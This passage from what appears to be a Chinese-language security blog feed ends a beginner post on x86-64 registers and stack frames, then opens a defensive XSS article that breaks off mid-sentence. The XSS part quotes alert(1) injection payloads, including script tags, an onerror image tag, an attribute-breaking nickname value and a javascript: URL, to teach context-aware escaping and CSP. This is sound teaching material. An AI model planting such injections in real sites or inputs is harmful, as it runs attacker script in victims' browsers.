&lt;p&gt;要注意的是，上面的寫法是 Intel 語法，如果是 AT&amp;amp;T 語法就將 &lt;code&gt;S&lt;/code&gt; 跟 &lt;code&gt;D&lt;/code&gt;反過來（如 &lt;code&gt;mov S,D&lt;/code&gt;）。&lt;/p&gt;
&lt;p&gt;首先，我們必須先理解暫存器與記憶體。CPU 只跑指令，而資料儲存交給記憶體，當 CPU 需要用到資料時就會向記憶體請求。我們可以把記憶體想像成一間很小的圖書館，門口有一個櫃子放本週最熱門的書籍，進門後一樓放各個老師指定的課本與參考資料，其他書籍都放在地下倉庫內。那麼今天有學生想借書，他要是在門口一看就能找到想要的那本當然是最有效率的，不然他就得走進去，在層架間仔細翻找，也許要一個小時才能找到。要是更慘都沒有，還要勞煩管理員到倉庫裡搜尋，說不定要一兩天功夫才行。越多的資料量查詢起來越沒有效率，反之，越少的資料越能快速存取。&lt;/p&gt;
&lt;p&gt;記憶體常見的結構如下圖。最上層是 CPU 暫存器（register），是存取最快速頻繁也最小的記憶體。再往下至快取（cache）、RAM、 hard drive ，能存的資料越來越多、體積越來越大、存取速度也越來越慢。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-01/memory-model.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;memory model，取自&lt;a href=&quot;https://www.itread01.com/content/1548607715.html&quot;&gt;組合語言入門教程&lt;/a&gt;&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;要看懂組合語言，首要之務就是了解暫存器。&lt;/p&gt;
&lt;p&gt;在 x86–64 結構下，暫存器都是 64 bits = 8 bytes 大小&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;#fn5&quot; id=&quot;fnref5&quot;&gt;[5]&lt;/a&gt;&lt;/sup&gt;，暫存器也可以部分存取，以 &lt;code&gt;rax&lt;/code&gt; 為例，&lt;code&gt;eax&lt;/code&gt; 指 &lt;code&gt;rax&lt;/code&gt; 的後 4 bytes、再對切得到 &lt;code&gt;ax&lt;/code&gt; 為倒數 2 bytes、然後再切分為 &lt;code&gt;ah&lt;/code&gt; 與 &lt;code&gt;al&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-01/reg-size.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;register sizes&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;暫存器的種類也非常多，一般來說，有 16 個一般用途暫存器，為 &lt;code&gt;rax&lt;/code&gt; &lt;code&gt;rbx&lt;/code&gt; &lt;code&gt;rcx&lt;/code&gt; &lt;code&gt;rdx&lt;/code&gt; &lt;code&gt;rdi&lt;/code&gt; &lt;code&gt;rsi&lt;/code&gt; &lt;code&gt;rbp&lt;/code&gt; &lt;code&gt;rsp&lt;/code&gt; &lt;code&gt;r8-r15&lt;/code&gt;，意指可能被用於任何運算操作。與之相對，屬於特殊用途暫存器的 &lt;code&gt;rip&lt;/code&gt; &lt;code&gt;rflags&lt;/code&gt;就不是可以拿來運算調用的。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-01/x64-regs.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;x64 registers，來自&lt;a href=&quot;https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&quot;&gt;布朗大學講義&lt;/a&gt;&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;每個暫存器傳統上都有特殊用途，例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;rax&lt;/code&gt; 常用於放函數回傳值跟乘除法運算結果&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rbx&lt;/code&gt; 常用於放 base address&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rcx&lt;/code&gt; 常用於回圈中的計數器（counter）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rdx&lt;/code&gt; 常用於存放資料&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rbp (base pointer)&lt;/code&gt; 指向當前函數 stack 上的底部（stack frame 下緣）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rsp (stack pointer)&lt;/code&gt; 指向當前函數 stack 上的頂部（stack frame 上緣）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rip (instruction pointer)&lt;/code&gt; 指向下一個要執行的 CPU 指令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;再來，我們看看 stack 跟 heap 。C 程式一般的記憶體配置如下圖。上面是高的記憶體位址（&lt;code&gt;0xffff…&lt;/code&gt;）下面是低的記憶體位址（&lt;code&gt;0x0000…&lt;/code&gt;），heap 在 &lt;code&gt;.bss&lt;/code&gt; 區段之後開始、隨著動態記憶體配置增加慢慢往上長，而 stack 則是從高的記憶體位址開始往下長。stack 放置的是靜態的、已知大小的資料，例如每一個函數內的區域變數以及函數的參數跟地址等等。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-01/memory-layout.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;memory layout，取自 &lt;a href=&quot;https://www.geeksforgeeks.org/memory-layout-of-c-program/&quot;&gt;geekforgeeks&lt;/a&gt;&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;程式執行時函數的呼叫就會以 stack frame 的方式層層堆疊，也可以想成記憶體是一個直立式的櫃子、每個函數是一本一本的書籍，裡面記載了這個函數內的各種變數，當一個函數被呼叫時，就把這本書平放到櫃子中書堆的最上面，完成後再從書堆上拿下來。&lt;/p&gt;
&lt;p&gt;那麼，誰去管理這個櫃子中的書堆，確保書籍有好好的被堆疊跟移除呢？&lt;/p&gt;
&lt;p&gt;管理函數之間參數傳遞、並規定誰負責清除堆疊的一套約定，我們稱為 calling convention ，或是國家教育研究院譯為呼叫約定。在不同的系統架構下會有不同的 calling convention，以 AMD64 系統（用於 Solaris、Linux、FreeBSD、MacOS 等 Unix 跟 Unix-like 系統）的 x86–64 為例，儲存函數前六個參數的暫存器依序為 &lt;code&gt;rdi&lt;/code&gt; &lt;code&gt;rsi&lt;/code&gt; &lt;code&gt;rdx&lt;/code&gt; &lt;code&gt;rcx&lt;/code&gt; &lt;code&gt;r8&lt;/code&gt; &lt;code&gt;r9&lt;/code&gt;，而函數 return 的回傳值則會放在 &lt;code&gt;rax&lt;/code&gt; 中（若大於一個暫存器的空間，例如回傳值在 64–128 bit，則會放在 &lt;code&gt;rax&lt;/code&gt; 跟 &lt;code&gt;rdx&lt;/code&gt;）。在呼叫一個函數前，呼叫者（caller）會把被呼叫的函數（callee）的參數放到暫存器中，再透過 &lt;code&gt;call&lt;/code&gt; 這個指令去執行 callee。而進入 callee 後，在進行主邏輯前，callee 會先創造自己的 stack frame，在 stack 上留一塊記憶體空間。邏輯執行結束時，用 &lt;code&gt;leave&lt;/code&gt; 把 stack frame 裡的東西清掉，最後 &lt;code&gt;ret&lt;/code&gt; 把控制權交回 caller。&lt;/p&gt;
&lt;p&gt;『創造自己的 stack frame』這個動作又稱為 function prologue，可以類比為書的前言、鋪成。實作上其實有一個組語指令叫 &lt;code&gt;enter n,0&lt;/code&gt;，不過因為他太慢了，所以通常用下面這段取代：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;push  ebp&lt;br&gt;mov   ebp, esp     # ebp = esp&lt;br&gt;sub   esp,  $n     # allocate space on the stack&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;搭配下圖由左而右來看，藍色區塊是 caller 的 stack frame，黃色是進行 &lt;code&gt;call&lt;/code&gt; 後把當前執行到的地方，也就是等等 callee 結束執行要返回的地方給存起來。第一行的 &lt;code&gt;push&lt;/code&gt; 把當前的 &lt;code&gt;ebp&lt;/code&gt; 放到 stack 上面，等同存好現在的 stack 基底，方便函數結束後回復到前一個函數的狀態，此時 stack 從左一變成左二，多了綠色的部分。第二行把 &lt;code&gt;ebp&lt;/code&gt; 指到現在 &lt;code&gt;esp&lt;/code&gt; 的位置，stack 從左二變成左三。第三行把 &lt;code&gt;esp&lt;/code&gt; 向上移大小為 n 的空間，也就是預留出 callee 函數所需要的記憶體，stack 變成最後一張，創造出了紅色部分的另一個 stack frame。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-01/prologue.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;function prologue&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;『清掉自己的 stack frame』這個動作又稱為 function epilogue，可以類比為書的後言。使用的組語指令叫 &lt;code&gt;leave&lt;/code&gt;，概念上等同下面這段：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;mov   esp, ebp     # esp = ebp&lt;br&gt;pop   ebp          # restore old ebp&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;搭配下圖由左而右來看，原始狀態就是前面 function prologue 完的樣子。第一行把 &lt;code&gt;esp&lt;/code&gt; 指回 &lt;code&gt;ebp&lt;/code&gt; 的地方，stack 從左一變成左二，這下子紅色的 callee stack frame 就被釋放出來了。第二行把 stack 上的值拿下來放回 &lt;code&gt;ebp&lt;/code&gt;，也就是把舊的 &lt;code&gt;ebp&lt;/code&gt; 位置還原回來，stack 變成最右邊的樣子，當前的記憶體最上面就回到 caller 的 stack frame 了。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-01/epilogue.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;function epilogue&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;%E7%B5%90%E8%AA%9E&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AA%9E&quot;&gt;#&lt;/a&gt; 結語&lt;/h2&gt;
&lt;p&gt;到這裡為止，我們其實都還沒開始逆向呢XDDD 先具備一些基礎知識是很重要的，知己知彼才能見招拆招嘛！&lt;/p&gt;
&lt;p&gt;這一篇我們先講解了逆向的起手式、基本的組合語言以及計算機結構、還有編譯完的程式碼以及記憶體的運作方式。上面只是針對AMD 的 x86–64 這一種結構做說明，有興趣的話可以去查查不同結構下的組合語言指令集跟 calling convention，可是很不同的喔！你也可以把這篇用到的小程式跟你電腦上別的程式用 GDB 或是 IDA 打開來看看，比較一下差異。&lt;/p&gt;
&lt;p&gt;總之，我們總算把前置準備完成，下一集我們來正式開始看 &lt;code&gt;main&lt;/code&gt; ！&lt;/p&gt;
&lt;hr class=&quot;footnotes-sep&quot;&gt;
&lt;section class=&quot;footnotes&quot;&gt;
&lt;ol class=&quot;footnotes-list&quot;&gt;
&lt;li id=&quot;fn1&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;小提醒：千萬別執行來路不明的檔案哦！一般來說提供軟體的廠商都會在下載點提供一個 MD5 checksum，也就是將這個檔案的資料做雜湊運算得出的一個值，你可以利用 linux 內建的 &lt;code&gt;md5sum&lt;/code&gt; 指令驗明正身！如果 &lt;code&gt;md5sum &amp;lt;file&amp;gt;&lt;/code&gt; 的到的結果跟網站標示的一樣才是對的！ &lt;a href=&quot;#fnref1&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&quot;fn2&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;在 dynamically linked 的時候，如果想看到有哪些外部函示庫被調用，以及他們的 base address，可以用 &lt;code&gt;ldd &amp;lt;filename&amp;gt;&lt;/code&gt; 查看，這部分的利用以後有 pwn 入門系列再來說明 XDD &lt;a href=&quot;#fnref2&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&quot;fn3&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;或者我們也可以用 &lt;code&gt;objdump&lt;/code&gt; 來看各區段的位置以及權限，指令為 &lt;code&gt;objdump -h &amp;lt;filename&amp;gt;&lt;/code&gt;，同一個檔案的輸出會長這樣 &lt;a href=&quot;#fnref3&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&quot;fn4&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;指令集：&lt;a href=&quot;https://software.intel.com/content/www/us/en/develop/articles/intel-sdm.html&quot;&gt;Intel 64 &amp;amp; 32 bits&lt;/a&gt;、&lt;a href=&quot;https://en.wikipedia.org/wiki/X86_instruction_listings&quot;&gt;維基百科&lt;/a&gt;、&lt;a href=&quot;https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&quot;&gt;x64 cheat sheet&lt;/a&gt; &lt;a href=&quot;#fnref4&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&quot;fn5&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;另外其實有 128 bit 的暫存器，例如用來傳遞浮點數的參數時使用的是 &lt;code&gt;XMM&lt;/code&gt; 系列，calling convention 跟一般用途暫存器類似，&lt;code&gt;XMM0-XMM7&lt;/code&gt; 用於傳遞參數，回傳值則會放在 &lt;code&gt;XMM0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-01/objdump.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;objdump output&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt; &lt;a href=&quot;#fnref5&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;

		</content>
	</entry>
	
	<entry>
		<title>淺談 XSS 攻擊與防禦的各個環節</title>
		<link href="https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/"/>
		<updated>2021-06-17T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/</id>
		<content type="html">
		  &lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;!-- summary --&gt;
&lt;p&gt;談到 XSS（Cross-site scripting），許多人可能都只想到「就是網站上被攻擊者植入程式碼」，但若是仔細去想的話，會發現這之中其實還有很多環節都可以再深入探討。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;而我所謂的這些「環節」，也可以理解成不同的「關卡」。&lt;/p&gt;
&lt;p&gt;舉例來說，第一關當然就是盡可能防止自己的網站被 XSS 攻擊，不要讓攻擊者在網站中能夠植入程式碼。而「讓攻擊者在網站中植入程式碼」這件事，又可以往下再細分成不同地方的植入，例如說 HTML 的植入，或者是 HTML 元素屬性中的植入，又或是 JavaScript 程式碼中的植入，這些都有著不同的攻擊以及防禦方式。&lt;/p&gt;
&lt;p&gt;而除了防止被植入程式碼以外，防守方應該還要進一步去想：「那如果真的不幸被植入程式碼了，可以怎麼辦？」&lt;/p&gt;
&lt;p&gt;這就是第二個關卡。雖然說第一關我們已經盡可能做好準備了，但難保不會有漏洞產生，因此守好第一關是不夠的，也要對第二關進行防守。&lt;/p&gt;
&lt;p&gt;假設今天攻擊者真的找到一個地方植入程式碼，那我們是不是可以想辦法阻止它執行？這就是 CSP（Content Security Policy）出場的時候了，藉由設定一些規則讓不合法的程式碼無法執行。例如說可以讓 inline 的 JavaScript 無法執行，那 &lt;code&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/code&gt; 就會變得無效。&lt;/p&gt;
&lt;p&gt;若是攻擊者真的很厲害，連 CSP 的規則都繞過了呢？這時就進入到第三關了，第三關的假設是攻擊者已經能夠在網站上執行任意程式碼。&lt;/p&gt;
&lt;p&gt;這時候還可以防守什麼呢？那就是試圖把損害控制到最低。&lt;/p&gt;
&lt;p&gt;以 Medium 這種部落格的平台來說，若是可以利用 XSS 把別人的帳號奪走（account takevoer），就是個嚴重的漏洞；或是因為 Medium 有付費牆的功能，因此若是能透過 XSS 把錢轉到攻擊者的帳號，也會是一個很嚴重的問題。&lt;/p&gt;
&lt;p&gt;而我們要在「網站已經被 XSS」的前提下，試圖去防禦這些攻擊。&lt;/p&gt;
&lt;p&gt;接著，就讓我們來看看不同的關卡有哪些不同的防禦方法。&lt;/p&gt;
&lt;h2 id=&quot;%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%94%BB%E6%93%8A%E8%80%85%E5%9C%A8%E7%B6%B2%E7%AB%99%E6%A4%8D%E5%85%A5%E7%A8%8B%E5%BC%8F%E7%A2%BC&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%94%BB%E6%93%8A%E8%80%85%E5%9C%A8%E7%B6%B2%E7%AB%99%E6%A4%8D%E5%85%A5%E7%A8%8B%E5%BC%8F%E7%A2%BC&quot;&gt;#&lt;/a&gt; 第一關：阻止攻擊者在網站植入程式碼&lt;/h2&gt;
&lt;p&gt;要防止 XSS 的第一步，當然就是阻止攻擊者在網站上植入他們想要的東西，核心精神可以濃縮成一句：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;永遠不要相信使用者的輸入&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;只要是有輸入的地方，都應該去做驗證。在輸出不被信任的資料時應該要做跳脫（escape）。&lt;/p&gt;
&lt;p&gt;舉例來說，今天有個地方可以讓使用者設定自己的暱稱，因為使用者可以自己輸入東西，所以在輸出這邊的資料時就要特別注意。&lt;/p&gt;
&lt;p&gt;如果在 render 時就是直接把使用者的輸入原封不動 render 出來，那若是使用者輸入的暱稱是：&lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;，任何人瀏覽這一頁的時候就會看到畫面跳出一個 alert，因為暱稱輸入的東西被當作程式碼執行了。&lt;/p&gt;
&lt;p&gt;這種攻擊可以成立的主因就是使用者的輸入變成了程式碼的一部分，導致未預期的行為。&lt;/p&gt;
&lt;p&gt;要防止這種行為，就是在 render 的時候要做跳脫。例如說要先把 &lt;code&gt;&amp;lt;&lt;/code&gt; 轉成 &lt;code&gt;&amp;amp;lt&lt;/code&gt;，這樣在畫面上看到的依然是 &lt;code&gt;&amp;lt;&lt;/code&gt;，但是對 parser 來說那並不是標籤開始的符號，而是文字的 &lt;code&gt;&amp;lt;&lt;/code&gt;，就不會被當作 HTML 標籤來解析。&lt;/p&gt;
&lt;p&gt;如此一來，就能防止攻擊者植入程式碼。&lt;/p&gt;
&lt;p&gt;不過，這還只是對跳脫的粗淺理解而已，真正需要注意的是在不同的情境之下，可能會需要用不同的方式跳脫，就如同這兩篇講的一樣：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.ptt.cc/bbs/Soft_Job/M.1582437563.A.6F7.html&quot;&gt;Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(1)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.ptt.cc/bbs/Soft_Job/M.1582441681.A.A7B.html&quot;&gt;Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(2)&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;假設你只有想到說要對標籤做跳脫，把 &lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt; 這兩個符號都做了 escape，那確實沒有辦法直接插入標籤。可是，如果 render 暱稱的地方是這樣呢？&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;img&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&amp;lt;?= avatar_url ?&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;alt&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&amp;lt;?= nickname ?&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token prolog&quot;&gt;&amp;lt;?= nickname ?&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;除了在 div 裡面輸出暱稱之外，也會在 img 的 alt 標籤裡把暱稱 render 出來。這時候如果只跳脫了 &lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt; 是不夠的，因為如果我讓 nickname 變成 &lt;code&gt;&amp;quot; onload=&amp;quot;alert(1)&lt;/code&gt; 的話，結合起來就會變成：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;img&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;avatar_url&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;alt&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token special-attr&quot;&gt;&lt;span class=&quot;token attr-name&quot;&gt;onload&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token value javascript language-javascript&quot;&gt;&lt;span class=&quot;token function&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&quot; onload=&quot;alert(1)&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;攻擊者可以利用 &lt;code&gt;&amp;quot;&lt;/code&gt; 關閉前面的屬性，然後創出一個新的屬性 &lt;code&gt;onload&lt;/code&gt;，達成 HTML 標籤屬性利用的 XSS。&lt;/p&gt;
&lt;p&gt;所以常見的特殊符號像是 &lt;code&gt;&amp;quot;&#39;&amp;lt;&amp;gt;&lt;/code&gt; 都要去做 escape，才能確保在不同地方時都有防禦效果。而這點其實許多程式語言或是 framework 都有做到了，例如說 PHP 的 htmlspecialchars：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/2755720/122629700-8743df00-d0f1-11eb-937b-910934140e96.png&quot; alt=&quot;xss1&quot;&gt;&lt;/p&gt;
&lt;p&gt;那這樣就打完收工了嗎？還沒。&lt;/p&gt;
&lt;p&gt;因為，在連結裡的內容又是另外一回事了，例如說：&lt;code&gt;&amp;lt;a href=&amp;quot;&amp;lt;?= link ?&amp;gt;&amp;quot;&amp;gt;my website&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有一種東西叫做 JavaScript pseudo-protocol，可以利用 &lt;code&gt;javascript:&lt;/code&gt; 來執行 JS 程式碼，像是這樣：&lt;code&gt;&amp;lt;a href=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;my website&amp;lt;/a&amp;gt;&lt;/code&gt;，在使用者點擊這個連結時，就會跳出 alert。&lt;/p&gt;
&lt;p&gt;而 &lt;code&gt;javascript:alert(1)&lt;/code&gt; 這幾個字，完全沒有包含我們上面需要 escape 的特殊字元 &lt;code&gt;&amp;quot;&#39;&amp;lt;&amp;gt;&amp;amp;&lt;/code&gt;，所以在這個狀況我們需要有不同的 escape 方法，或者是直接檢查內容，指定開頭必須要是 &lt;code&gt;http://&lt;/code&gt; 或是 &lt;code&gt;http://&lt;/code&gt; 之類的。&lt;/p&gt;
&lt;p&gt;這就是我剛剛講的，在不同地方，需要用不同的方式來進行跳脫及防禦。如果都是用同一種的話，有些地方就會失效。&lt;/p&gt;
&lt;p&gt;有些人看到這邊會想說：「阿～不用擔心啦！我用的前端框架都幫我做好了，預設都會 escape 啦！不會被 XSS」&lt;/p&gt;
&lt;p&gt;這個宣稱大部分是對的，現在確實很多前端的框架會處理這件事，但要特別注意我剛剛提的 href 的例子，因為 &lt;code&gt;javascript:alert(1)&lt;/code&gt; 這幾個字元都不是特殊字元，所以跳脫完還是長一樣，依然會有這樣的漏洞。&lt;/p&gt;
&lt;p&gt;React 在 v16.9 的時候就針對這個 case 新增了警告：&lt;a href=&quot;https://reactjs.org/blog/2019/08/08/react-v16.9.0.html#deprecating-javascript-urls&quot;&gt;Deprecating javascript: URLs&lt;/a&gt;，並且在之後的 release 中會自動阻擋這個行為。不過根據測試的結果，目前的版本 v17.0.2 只會警告而已，還不會阻擋。&lt;/p&gt;
&lt;p&gt;這邊有一些相關的討論：&lt;a href=&quot;https://github.com/facebook/react/issues/16592&quot;&gt;React@16.9 block javascript:void(0); #16592&lt;/a&gt; 與 &lt;a href=&quot;https://github.com/facebook/react/issues/16382&quot;&gt;False-positive security precaution warning (javascript: URLs) #16382&lt;/a&gt;，想看程式碼的話在這邊：&lt;a href=&quot;https://github.com/facebook/react/blob/v17.0.2/packages/react-dom/src/shared/sanitizeURL.js&quot;&gt;react/packages/react-dom/src/shared/sanitizeURL.js &lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;除了看使用情境跳脫不是件容易的事情以外，意識到有哪些地方是使用者可以自己輸入的也沒有想像中簡單。&lt;/p&gt;
&lt;p&gt;因為除了資料庫或者是 API 是你的資料來源之外，URL 可能也是。有些程式碼會直接把網址列上的某個 query string 放到 JS 裡，之後直接把這個變數輸出到畫面上，這就是無意間信任了不該信任的資料。&lt;/p&gt;
&lt;p&gt;舉例來說，搜尋頁面的網址可能長這樣：&lt;code&gt;https://example.com/search?q=hello&lt;/code&gt;，而在程式中是這樣寫的：&lt;/p&gt;
